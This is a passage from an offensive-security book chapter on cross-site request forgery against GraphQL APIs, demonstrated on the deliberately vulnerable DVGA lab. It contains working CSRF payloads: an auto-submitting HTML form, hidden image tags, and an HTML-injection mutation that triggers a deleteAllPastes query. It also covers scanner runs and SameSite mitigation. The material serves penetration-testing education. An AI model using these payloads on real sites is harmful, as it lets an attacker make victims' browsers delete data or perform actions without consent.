
![](img/2f244b00cd9f8f37cfc22f928aaa471a_253_0.png)

Figure 9-4: A paste created via a CSRF attack

Congratulations! You just simulated forging a paste mutation on behalf of a victim.

## Testing for GET-Based Vulnerabilities

Many GraphQL implementations forbid any use of GET, but sending mutations by using the GET method is especially taboo, because it’s considered a security risk that could lead to CSRF vulnerabilities, as you’ve learned. More often than not, GraphQL servers will reject any incoming queries that use a mutation over the GET method. To test whether a GraphQL server supports them, you could send a cURL command like this one:

```
# curl -X GET "http://localhost:5013/graphql?query=mutation%20%7B%20__typename%20%7D"
```

The %20 indicates spaces, %7B and %7D are the URL-encoded opening and closing curly brackets ({}) of the mutation query, and the plus sign (+) is an encoded space. When sent to DVGA, the response to this cURL command is as follows:

```
{"errors":[{"message":"Can only perform a mutation operation from a POST request."}]}
```

As you can see, DVGA does not allow mutations using the GET method. However, in penetration tests, assume that nothing is off the table and test all hypotheses, because you never know when you will run into a completely custom GraphQL implementation that deviates from the standard.

GET-based CSRF attacks are somewhat more interesting than POST-based ones because applications often won’t implement anti-CSRF protections on GET requests. This is because state-changing actions typically use other HTTP methods. If a server allows mutations over GET, we could exploit the HTML anchor (<a>) tag with the hypertext reference attribute (href) to build a hyperlink that will send the mutation to the server. The anchor tag executes only GET-based requests, which is why it isn’t a great candidate for POST-based CSRF exploitation:

```
<a href="http://localhost:5013/graphql?query=mutation{someSensitiveAction}" />
```

Alternatively, we could use image tags (<img>) with the source (src) attribute to embed our mutation, like so:

```
<img src="http://localhost:5013/graphql?query=mutation{someSensitiveAction}" />
```

This technique works on any platform that lets you specify innocent-looking HTML tags such as <a> and <img>. Thus, in addition to tricking victims to visit an attacker-controlled website containing these links, you might be able to use them in legitimate websites that accept URLs and render the links on the client side. As a result, clients will make direct GET requests to another site chosen by the attacker.

Although we can't send mutations to DVGA by using the GET method, we can try using GET to send the state-changing query deleteAllPastes. As the name implies, the deleteAllPastes query will delete all pastes in the server's database. We can exploit this query by using either GET or POST.

To perform such a CSRF attack, this HTML file uses <form> tags to submit the query. JavaScript code defined using the <script> HTML tags makes the request automatically, as soon as the victim loads the page:

```
<html>
<body>
<h1>This form is going to submit itself in 2 seconds...</h1>
<form id="auto_submit_form" method="GET" action="http://localhost:5013/graphql">
<input type="hidden" name="query" value="query { deleteAllPastes }"/>
<input type="submit" value="Submit">
</form>
</body>

<script>
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function csrf() {
  for (let i = 0; i < 2; i++) {
    await sleep(i * 1000);
  }
  document.forms['auto_submit_form'].submit();
}

csrf();

</script>
</html>
```

To test this attack, save the file at https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/get_csrf_submit_auto.html to your desktop as an HTML file. Make sure Burp Suite is intercepting traffic, and then drag

and drop the HTML file into your browser window. You should see the outbound HTTP GET request sent after two seconds:

```
GET /graphql?query=query+%7B+deleteAllPastes+%7D HTTP/1.1
Host: localhost:5013
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
--snip--
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

We’re able to use CSRF to forge a GET-based query that deletes all pastes. Now let’s try using HTML tags such as <a> and <img> to trigger a GET-based CSRF. One way to do this is to create an HTML page that performs a GET request using an <img> tag, such as the one in Listing 9-5.

```
<html>
<body>
<h1>GET-based CSRF using an image tag</h1>
<img src="http://localhost:5013/graphql?query={deleteAllPastes}" style="display: none;" />
</body>
</html>
```

Listing 9-5: GET-based CSRF using image tags

Save this as an HTML file. As before, it will execute as soon as the page loads, because the browser will try to fetch the URL defined using the src attribute and send a GraphQL query.

## Using HTML Injection

A second way we could exploit GET-based CSRF is by abusing another vulnerability, such as HTML injection, which allows an attacker to inject HTML tags into a web page. If a victim visits the site, their browser will render the HTML code. In particular, if an attacker is able to inject a hyperlink using the <a> tag or an image link using the <img> tag, clients will initiate the GET request when they visit the page, following the tags’ default behavior.

Can we trigger CSRF on DVGA using HTML injection? Let’s find out. Open Firefox, navigate to http://localhost:5013, and go to the Public Pastes page. Next, open Developer Tools (CTRL-SHIFT-I) and go to the Network tab. Ensure that Altair is pointing to http://localhost:5013/graphql and enter the mutation in Listing 9-6, which will create a new paste with a CSRF payload as its content.

```
mutation {
  createPaste(content:"<img src=\"http://localhost:5013/graphql?query={ deleteAllPastes }\" /></img>", title:"CSRF using image tags", public: true, burn: false) {
    paste {
      id
      content
```
```
}
}
}
```

# Listing 9-6: Creating a paste containing a CSRF payload

This request injects the <img> tag containing the deleteAllPastes query into the Public Pastes page. To do so, it relies on the fact that DVGA fetches paste data by using GraphQL subscriptions (with WebSocket as the transport protocol). Your browser subscribes to new paste-creation events, so whenever a new paste is created, the subscription automatically populates the page with its title, content, and other information. By putting our payload in the createPaste content field, we effectively embed it on the page.

Now, when clients send queries using createPaste and the content field, they will render the payload. Take a close look at what happens in your Network tab once you send the query. You should see the outbound GET request shown in Figure 9-5.

![](img/2f244b00cd9f8f37cfc22f928aaa471a_256_0.png)

## Figure 9-5: A GET-based query sent through an HTML image tag containing a CSRF payload

If you refresh your browser, you should no longer see any pastes, as the CSRF attack should have deleted them. Click Rollback DVGA, located in the top-right drop-down menu, to restore the server to its original state.

We’ve discussed GET- and POST-based CSRF attacks. We’ve also discussed how some GraphQL servers attempt to prevent CSRF by rejecting mutations using the GET method, and how to test for those as well. Next, let’s use BatchQL and GraphQL Cop to automatically flag GraphQL servers that might be vulnerable to CSRF.

## Automating Testing with BatchQL and GraphQL Cop

BatchQL has multiple CSRF-related test cases. Let’s run it against DVGA to see what information we’re able to get about its CSRF vulnerabilities:

```
# cd ~/batchql
# python3 batch.py -e http://localhost:5013/graphql | grep -i CSRF

CSRF GET based successful. Please confirm that this is a valid issue.
CSRF POST based successful. Please confirm that this is a valid issue.
```

As you can see, we used grep with the -i flag to filter out results unrelated to CSRF vulnerabilities. BatchQL detected that both GET and POST allow non-JSON-based queries.

GraphQL Cop is similar to BatchQL in the way it tests for CSRF vulnerabilities, except it additionally tests whether the server supports mutations over GET:

```
# cd ~/graphql-cop
# python3 graphql-cop.py -t http://localhost:5013/graphql | grep -i CSRF

[MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF))
[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery)
```

Automated tools may introduce false positives, so we recommend always manually verifying that their results are accurate.

## Preventing CSRF

In the years since CSRF was discovered, browser vendors such as Mozilla and Google have significantly improved their CSRF mitigations. Various open source web server frameworks have also made CSRF vulnerabilities tremendously harder to exploit. This section explains the CSRF mitigations that exist today at the browser and server levels.

## The SameSite Flag

Browsers have started supporting a special HTTP cookie attribute called SameSite. This attribute allows developers to decide whether the client browser should attach the cookie when making cross-site requests. To set this cookie attribute, the application needs to set a Set-Cookie response header. This interferes with a CSRF attack’s attempt to send a request from the attacker website (say, attacker.com) to a target website of interest (banking.com).

One challenge with using the SameSite attribute is that older browsers may not support it. However, most of the modern browsers do. Mozilla’s Developer website has a dedicated section about SameSite browser support that developers can use as a reference.
